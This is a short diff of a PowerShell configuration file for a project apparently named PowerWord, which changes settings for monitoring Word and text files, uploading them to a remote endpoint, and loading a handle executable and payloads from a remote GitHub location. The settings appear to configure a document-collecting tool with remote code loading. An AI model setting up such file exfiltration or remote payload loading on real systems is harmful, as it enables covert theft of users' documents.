@@ -6,16 +6,16 @@ $global:LiveMode = $true
 $global:LiveModeInterval = 5
 $global:WordFileExtentions =@("docx","txt")
 
-$global:CommunicationMethod = "remote"
-$global:Remote = "http://127.0.0.1:5000/files/upload"
+$global:CommunicationMethod = "smb"
+$global:Remote = "C:\temp\"
 
 $global:HandelsMethod = "code"
 $global:HandlesExeMethod = "remote"
 $global:HandlesExePath = "D:\git\PowerWord\handle123.exe"
-$global:HandlesExeRemoteLocation = "http://127.0.0.1:8000/"
+$global:HandlesExeRemoteLocation = "https://raw.githubusercontent.com/Lemonada/PowerWord/master/"
 
 $global:LoadFromRemote = "yes"
-$global:RemoteLoadPath = "http://127.0.0.1:8000/"
+$global:RemoteLoadPath = "https://raw.githubusercontent.com/Lemonada/PowerWord/master/"
 
 $global:HandlePaylod = "default"
 $global:MonitorPayload = "default"
